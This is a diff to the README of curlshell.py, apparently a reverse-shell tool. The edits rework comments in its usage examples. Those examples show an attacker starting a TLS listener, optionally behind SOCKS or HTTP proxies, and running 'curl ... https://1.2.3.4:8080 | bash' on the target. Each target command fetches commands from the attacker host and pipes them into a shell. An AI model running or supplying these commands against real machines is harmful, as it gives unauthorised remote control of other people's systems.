@@ -17,6 +17,7 @@ openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -sha256 -days 3
 ## Without Proxy
 
 ```sh
+# Start your listener
 ./curlshell.py --certificate cert.pem --private-key key.pem --listen-port 8080
 ```
 ```sh
@@ -29,7 +30,6 @@ curl -skfL https://1.2.3.4:8080 | bash
 ./curlshell.py -x socks5h://5.5.5.5:1080 --certificate cert.pem --private-key key.pem --listen-port 8080 
 ```
 ```sh
-# On the target:
 curl -x socks5h://5.5.5.5:1080 -skfL https://1.2.3.4:8080 | bash
 ```
 
@@ -38,7 +38,6 @@ curl -x socks5h://5.5.5.5:1080 -skfL https://1.2.3.4:8080 | bash
 ./curlshell.py -x http://5.5.5.5:3128 --certificate cert.pem --private-key key.pem --listen-port 8080 
 ```
 ```sh
-# On the target:
 curl -x http://5.5.5.5:1080 -skfL https://1.2.3.4:8080 | bash
 ```
 
@@ -47,7 +46,6 @@ curl -x http://5.5.5.5:1080 -skfL https://1.2.3.4:8080 | bash
 ./curlshell.py --listen-port 8080
 ```
 ```sh
-# On the target:
 curl -sfL http://1.2.3.4:8080 | bash
 ```
 
